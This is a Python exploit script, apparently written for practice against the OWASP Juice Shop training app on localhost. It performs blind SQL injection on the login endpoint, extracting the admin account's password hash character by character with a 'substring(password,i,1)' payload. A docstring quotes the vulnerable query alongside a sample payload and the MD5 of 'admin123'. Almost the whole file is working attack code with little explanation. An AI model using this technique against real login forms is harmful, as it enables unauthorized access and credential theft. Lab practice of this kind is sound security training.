import requests
import time

'''
Vulnerability: SQL Injection
    models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true }) // vuln-code-snippet vuln-line loginAdminChallenge loginBenderChallenge loginJimChallenge

Next Exploit:
{"email":"admin@juice-sh.op' and substring(password,1,1)='0' -- -","password":"P@ssw0rd"}
md5: 0192023a7bbd73250516f069df18b500
'''

def make_request(i):
    url = "http://localhost:3000/rest/user/login"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36",
    }

    cookies = {
        "language": "en",
    }

    proxies = {
        "http": "http://localhost:8080",
        "https": "http://localhost:8080",
    }

    charList = "0123456789abcdefghijklmnopqrstuvwxyz"

    for c in charList:
        data = {
            "email": f"admin@juice-sh.op' and substring(password,{i},1)='{c}' -- -",
            "password": "fff"
        }

        response = requests.post(url, headers=headers, cookies=cookies, json=data, proxies=proxies, verify=False)

        if "Invalid email or password" not in response.text:
            print(f"Password {i}: {c}")
            return(c)

if __name__ == "__main__": 
    start_time = time.time()

    pwStr = ''
    for i in range(1, 33):
        pwStr += make_request(i)

    # admin123 : 0192023a7bbd73250516f069df18b500
    print(f"Password : {pwStr}")

    if pwStr == "0192023a7bbd73250516f069df18b500":
        print("Success")  
    else:   
        print("Failed")   

    end_time = time.time()
    total_time = end_time - start_time
    print(f"Time: {total_time} seconds")